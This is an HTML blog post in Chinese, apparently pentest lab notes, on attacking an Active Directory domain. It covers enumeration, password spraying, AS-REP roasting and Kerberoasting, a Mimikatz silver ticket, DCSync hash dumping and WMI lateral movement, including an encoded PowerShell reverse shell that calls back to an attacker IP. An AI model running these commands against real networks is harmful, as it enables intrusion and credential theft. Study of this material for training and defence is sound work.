@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="使用Windows自带命令进行信息收集查询域内的用户 1net user &#x2F;domain  查询某个用户在域内的所属用户组和权限 1net user jeffadmin &#x2F;domain  查询域内的所有组 1net group &#x2F;domain  查询域内某个组的所有成员 1net group &quot;Sales Department&quot; &#x2F;domain  使用PowerShell脚本进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AD Lateral Movement">
+<meta property="og:url" content="http://example.com/2024/06/05/AD-Lateral-Movement/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="使用Windows自带命令进行信息收集查询域内的用户 1net user &#x2F;domain  查询某个用户在域内的所属用户组和权限 1net user jeffadmin &#x2F;domain  查询域内的所有组 1net group &#x2F;domain  查询域内某个组的所有成员 1net group &quot;Sales Department&quot; &#x2F;domain  使用PowerShell脚本进">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-05T06:37:05.000Z">
+<meta property="article:modified_time" content="2024-06-05T06:44:54.871Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>AD Lateral Movement</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/06/05/File-Tranfer/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/AD-Lateral-Movement/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/AD-Lateral-Movement/&text=AD Lateral Movement"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/AD-Lateral-Movement/&is_video=false&description=AD Lateral Movement"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AD Lateral Movement&body=Check out this article: http://example.com/2024/06/05/AD-Lateral-Movement/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/AD-Lateral-Movement/&name=AD Lateral Movement&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/AD-Lateral-Movement/&t=AD Lateral Movement"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Windows%E8%87%AA%E5%B8%A6%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">使用Windows自带命令进行信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PowerShell%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">使用PowerShell脚本进行信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">自动化域内信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">凭据攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">明文攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4%E5%93%88%E5%B8%8C"><span class="toc-number">4.2.</span> <span class="toc-text">获取域用户的口令哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%A5%A8%E6%8D%AE%E5%87%AD%E8%AF%81"><span class="toc-number">5.</span> <span class="toc-text">伪造票据凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%9F%9F%E5%86%85%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">拿域内任意用户的凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.</span> <span class="toc-text">内网横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8WMI%E5%92%8CWinRM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.1.</span> <span class="toc-text">使用WMI和WinRM进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PsExec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.2.</span> <span class="toc-text">使用PsExec进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-hash"><span class="toc-number">7.3.</span> <span class="toc-text">Pass the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Over-pass-the-hash"><span class="toc-number">7.4.</span> <span class="toc-text">Over pass the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Ticket"><span class="toc-number">7.5.</span> <span class="toc-text">Pass the Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.6.</span> <span class="toc-text">使用DCOM进行横向移动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%A7%E5%88%B6"><span class="toc-number">8.</span> <span class="toc-text">内网持久化控制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.1.</span> <span class="toc-text">黄金票据</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        AD Lateral Movement
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-05T06:37:05.000Z" class="dt-published" itemprop="datePublished">2024-06-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="使用Windows自带命令进行信息收集"><a href="#使用Windows自带命令进行信息收集" class="headerlink" title="使用Windows自带命令进行信息收集"></a>使用Windows自带命令进行信息收集</h2><p>查询域内的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>
+
+<p>查询某个用户在域内的所属用户组和权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user jeffadmin /domain</span><br></pre></td></tr></table></figure>
+
+<p>查询域内的所有组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+
+<p>查询域内某个组的所有成员</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Sales Department&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用PowerShell脚本进行信息收集"><a href="#使用PowerShell脚本进行信息收集" class="headerlink" title="使用PowerShell脚本进行信息收集"></a>使用PowerShell脚本进行信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-NetDomain</span><br><span class="line">Get-NetUser</span><br><span class="line">Get-NetUser | select cn</span><br><span class="line">Get-NetUser | select cn,pwdlastset,lastlogon</span><br><span class="line">Get-NetGroup | select cn</span><br><span class="line">Get-NetGroup &quot;Sales Department&quot; | select member</span><br><span class="line">Get-NetComputer</span><br><span class="line">Get-NetComputer | select operatingsystem,dnshostname</span><br><span class="line"></span><br><span class="line"># 查找域内共享</span><br><span class="line">Find-DomainShare</span><br><span class="line"></span><br><span class="line"># 访问域内共享</span><br><span class="line">ls \\dc1.corp.com\sysvol\corp.com\</span><br><span class="line"></span><br><span class="line"># 返回当前域用户可能在哪台机器上有管理员权限</span><br><span class="line">Find-LocalAdminAccess</span><br><span class="line"></span><br><span class="line"># 查找指定机器上有哪些用户登录</span><br><span class="line">Get-NetSession -ComputerName 主机名</span><br><span class="line"></span><br><span class="line"># 查询域内主机名和操作系统信息</span><br><span class="line">Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion</span><br><span class="line"></span><br><span class="line"># 返回在client74机器上的可能会话，如果当前用户有权限登录client74，就有可能能够拿到该机器上其他用户的凭据</span><br><span class="line">.\PsLoggedon.exe \\client74</span><br></pre></td></tr></table></figure>
+
+<h2 id="自动化域内信息收集"><a href="#自动化域内信息收集" class="headerlink" title="自动化域内信息收集"></a>自动化域内信息收集</h2><p>使用SharpHound </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Sharphound.ps1</span><br><span class="line"># 收集域内所有信息，收集完毕之后会在目标目录下生成一个.zip文件</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -OutputPrefix &quot;corp audit&quot;</span><br><span class="line"></span><br><span class="line"># 在Kali上使用BloodHound分析域环境</span><br><span class="line"># Kali运行</span><br><span class="line">sudo neo4j start</span><br><span class="line"># 服务启动后在新终端运行</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
+
+<h2 id="凭据攻击"><a href="#凭据攻击" class="headerlink" title="凭据攻击"></a>凭据攻击</h2><p>主要解决了拿到域内用户凭据之后怎么做</p>
+<h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>第一是密码喷洒，直接明文攻击，也就是爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 方法一</span><br><span class="line">powershell -ep bypass</span><br><span class="line"></span><br><span class="line"># —Pass指定密码，也可以-File指定字典，脚本会自动识别域内用户并进行攻击，-Admin会自动测试管理员账户</span><br><span class="line">.\Spray-Passwords.ps1 -Pass Nexus123! -Admin</span><br><span class="line"></span><br><span class="line"># 方法二，使用smb协议，这种攻击方式较慢</span><br><span class="line"># -u 和 -p 提供字典或单个字符串。-d 域名，--continue-on-success，避免在第一个有效凭据处停止</span><br><span class="line">crackmapexec smb 192.168.50.75 -u users.txt -p &#x27;Nexus123!&#x27; -d corp.com -- continue-on-success</span><br><span class="line"></span><br><span class="line"># 方法一和方法二的区别在于crackmapexec 在开始密码喷洒之前不会检查域的密码策略，但是crackmapexec会返回成功的用户是否在目标机器上有管理员权限，如下</span><br><span class="line">crackmapexec smb 192.168.50.75 -u dave -p &#x27;Flowers1&#x27; -d corp.com</span><br><span class="line"># 如果上述命令返回Pwn3d!，则代表dave用户在.75机器上有管理员权限</span><br><span class="line"></span><br><span class="line"># 方法三</span><br><span class="line">.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt &quot;Nexus123!&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取域用户的口令哈希"><a href="#获取域用户的口令哈希" class="headerlink" title="获取域用户的口令哈希"></a>获取域用户的口令哈希</h3><p>默认情况下，AD 用户帐户选项“不需要 Kerberos 预身份验证”处于禁用状态，这意味着对所有用户执行 Kerberos 预身份验证。但是，可以手动启用此帐户选项，如果该选项被启用，意味着没有 Kerberos 预身份验证，攻击者可以代表任何 AD 用户向域控制器发送 AS-REQ。从域控制器获取 AS-REP 后，攻击者可以对响应的加密部分执行离线密码攻击。这种攻击称为 AS-REP Roasting，可以拿到hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 方法一</span><br><span class="line"></span><br><span class="line"># -dc-ip指定dc的IP，-outputfile指定输出文件，corp.com/pete指定域用户</span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete</span><br><span class="line"></span><br><span class="line"># hashes.asreproast</span><br><span class="line">$krb5asrep$23$dave@CORP.COM:b24a619cfa58...</span><br><span class="line"></span><br><span class="line"># hashcat破解凭据</span><br><span class="line">sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 方法二，使用Rubeus.exe，会自动识别可以拿到hash的用户</span><br><span class="line">.\Rubeus.exe asreproast /nowrap</span><br><span class="line">.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</span><br><span class="line">sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</span><br><span class="line"># 在kali上也可以达到相同的效果，需要指定DC的用户名</span><br><span class="line">sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</span><br><span class="line"># PS：hashcat破解的时候最好两个mode都试一下</span><br></pre></td></tr></table></figure>
+
+<h2 id="伪造票据凭证"><a href="#伪造票据凭证" class="headerlink" title="伪造票据凭证"></a>伪造票据凭证</h2><p>如果拿到了服务帐户密码或其关联的 NTLM 哈希，我们可以伪造自己的服务票证，以任何我们想要的权限访问目标资源（下面的示例中为 IIS 应用程序）。此自定义创建的票证称为银票，如果服务主体名称在多台服务器上使用，则可以利用银票来对付所有服务器。</p>
+<p>一般来说，需要收集以下三条信息来创建银票：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SPN 密码哈希</span><br><span class="line">域 SID</span><br><span class="line">目标 SPN</span><br></pre></td></tr></table></figure>
+
+<p>如下，以Jeff身份登录域内机器，访问iis_service的web服务，被拒绝</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr -UseDefaultCredentials http://web04</span><br></pre></td></tr></table></figure>
+
+<p>第一步，需要拿到iis_service服务账户的NTLM哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>第二步，获取域 SID，可以输入 <code>whoami /user</code> 来获取当前用户的 SID。或者，也可以从 Mimikatz 的输出中检索 SPN 用户帐户的 SID，SID 由几个部分组成，我们只对域 SID 感兴趣。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line"># 返回S-1-5-21-1987370270-658905905-1781884369-1105，只需要1105前面的部分</span><br></pre></td></tr></table></figure>
+
+<p>第三步，获取目标的SPN，这里是web04上的HTTP SPN资源，因为我们想要访问在IIS上运行的网页</p>
+<p>三个要素都收集好了之后，使用 kerberos::golden 模块创建伪造的服务票证，需要提供域 SID (&#x2F;sid:)、域名 (&#x2F;domain:) 和 SPN 运行的目标 (&#x2F;target:)。我们还需要包括 SPN 协议 (&#x2F;service:)、SPN 的 NTLM 哈希 (&#x2F;rc4:) 和 &#x2F;ptt 选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369</span><br><span class="line">/domain:corp.com /ptt /target:web04.corp.com /service:http</span><br><span class="line">/rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</span><br><span class="line"></span><br><span class="line"># 返回如下</span><br><span class="line">User       : jeffadmin</span><br><span class="line">Domain     : corp .com (CORP)</span><br><span class="line">SID        : S-1-5-21-1987370270-658905905-1781884369</span><br><span class="line">User Id    : 500</span><br><span class="line">Groups Id : *513 512 520 518 519</span><br><span class="line">ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt</span><br><span class="line">Service    : http</span><br><span class="line">Target     : web04.corp.com</span><br><span class="line">Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line">* PAC generated</span><br><span class="line">* PAC signed</span><br><span class="line">* EncTicketPart generated</span><br><span class="line">* EncTicketPart encrypted</span><br><span class="line">* KrbCred generated</span><br><span class="line">Golden ticket for &#x27;jeffadmin @ corp .com&#x27; successfully submitted for current session</span><br></pre></td></tr></table></figure>
+
+<p>上面运行的结果返回表示SPN HTTP&#x2F;web04.corp.com 的新服务票证已加载到内存中，并且 Mimikatz 在伪造的票证中设置了适当的组成员权限。从 IIS 应用程序的角度来看，当前用户既是内置的本地管理员（User Id：500），又是几个高权限组的成员，域管理员组（Groups Id ID：512），然后就可以正常访问目标服务了。</p>
+<h2 id="拿域内任意用户的凭证"><a href="#拿域内任意用户的凭证" class="headerlink" title="拿域内任意用户的凭证"></a>拿域内任意用户的凭证</h2><p>前提是拿到域管理员组的权限用户之后，鸡肋</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:corp\dave</span><br></pre></td></tr></table></figure>
+
+<p>返回了dave用户的HTLM哈希就能爆破了</p>
+<h2 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h2><h3 id="使用WMI和WinRM进行横向移动"><a href="#使用WMI和WinRM进行横向移动" class="headerlink" title="使用WMI和WinRM进行横向移动"></a>使用WMI和WinRM进行横向移动</h3><p>为了通过 WMI 在远程目标上创建进程，需要管理员本地组成员的凭据，该成员也可以是域用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过WMI执行Power Shell reverse shell</p>
+<p>使用python对shellcode进行base64编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = <span class="string">&#x27;$client = New-Object</span></span><br><span class="line"><span class="string">System.Net.Sockets.TCPClient(&quot;192.168.118.2&quot;,443);$stream =</span></span><br><span class="line"><span class="string">$client .GetStream();[byte[]]$bytes = 0 . .65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName</span></span><br><span class="line"><span class="string">System.Text.ASCIIEncoding) .GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-</span></span><br><span class="line"><span class="string">String );$sendback2 = $sendback + &quot;PS &quot; + (pwd) .Path + &quot;&gt; &quot;;$sendbyte =</span></span><br><span class="line"><span class="string">([text.encoding]::ASCII) .GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte .Leng</span></span><br><span class="line"><span class="string">th);$stream .Flush()&#125;;$client .Close()&#x27;</span></span><br><span class="line">cmd = <span class="string">&quot;powershell -nop -w hidden -e &quot;</span> +</span><br><span class="line">base64.b64encode(payload.encode(<span class="string">&#x27;utf16&#x27;</span>)[<span class="number">2</span>:]).decode()</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$username</span> = <span class="string">&#x27;jen&#x27;</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$password</span> = <span class="string">&#x27;Nexus123!&#x27;</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$secureString</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlaintext</span> - Force;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$secureString</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$Options</span> = <span class="built_in">New-CimSessionOption</span> <span class="literal">-Protocol</span> DCOM</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$Session</span> = <span class="built_in">New-Cimsession</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">50.73</span> <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-SessionOption</span> <span class="variable">$Options</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="variable">$Command</span> = <span class="string">&#x27;powershell -nop -w hidden -e</span></span><br><span class="line"><span class="string">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...</span></span><br><span class="line"><span class="string">HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#x27;</span>;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\jeff&gt; <span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span 